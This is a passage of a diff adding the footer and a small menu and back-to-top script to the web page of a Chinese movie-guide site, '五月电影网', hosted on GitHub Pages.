+        <p>五月电影网（wuyuedianyingwang-app）专注于为影迷提供高清电影在线观看指引、热播大片追踪与深度影评解析，帮助每一位观众找到值得一看的好电影。</p>
+      </div>
+      <div class="foot-col">
+        <h5>网站导航</h5>
+        <a href="#now">正在热映</a>
+        <a href="#cate">影片分类</a>
+        <a href="#pick">编辑精选</a>
+        <a href="#rank">口碑榜单</a>
+      </div>
+      <div class="foot-col">
+        <h5>影片类型</h5>
+        <a href="#">动作片</a>
+        <a href="#">喜剧片</a>
+        <a href="#">科幻片</a>
+        <a href="#">悬疑片</a>
+      </div>
+      <div class="foot-col">
+        <h5>关于我们</h5>
+        <a href="#">网站简介</a>
+        <a href="#">联系合作</a>
+        <a href="#">免责声明</a>
+        <a href="#">隐私政策</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <p>© 2026 五月电影网（wuyuedianyingwang-app） 官方网站：<a href="https://wuyuedianyingwang-app.github.io" style="color:#f5a623">https://wuyuedianyingwang-app.github.io</a> · 保留所有权利</p>
+      <div class="foot-links">
+        <a href="#now">正在热映</a>
+        <a href="#cate">影片分类</a>
+        <a href="#pick">编辑精选</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#talk">影迷之声</a>
+        <a href="#sub">订阅更新</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<button class="to-top" id="toTop" aria-label="回到顶部">↑</button>
+
+<script>
+// 移动端菜单
+var menuBtn=document.getElementById('menuToggle');
+var navLinks=document.getElementById('navLinks');
+menuBtn.addEventListener('click',function(){navLinks.classList.toggle('open');});
+navLinks.addEventListener('click',function(e){if(e.target.tagName==='A')navLinks.classList.remove('open');});
+
+// 回到顶部
+var toTop=document.getElementById('toTop');
+window.addEventListener('scroll',function(){
+  if(window.scrollY>500)toTop.classList.add('show');else toTop.classList.remove('show');
+});
+toTop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
